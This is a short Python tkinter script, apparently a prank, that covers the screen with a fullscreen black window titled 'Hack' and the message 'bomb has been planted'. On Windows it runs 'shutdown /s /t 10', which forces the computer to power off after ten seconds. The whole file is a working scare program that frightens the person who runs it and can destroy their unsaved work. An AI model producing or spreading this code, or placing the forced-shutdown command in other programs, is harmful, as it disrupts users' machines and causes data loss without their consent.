import os
from tkinter import *

root = Tk()

root['bg'] = '#000000'

root.title('Hack')

root.geometry('1920x1080')

root.resizable(False, False)

title = Label(text='bomb has been planted', font=('Times New Roman', 70),foreground='#ffffff', background='#000000',justify='center', height='940')
title.pack()

root.attributes("-fullscreen", True)
if os.name == 'nt':
    os.system('shutdown /s /t 10')
root.mainloop()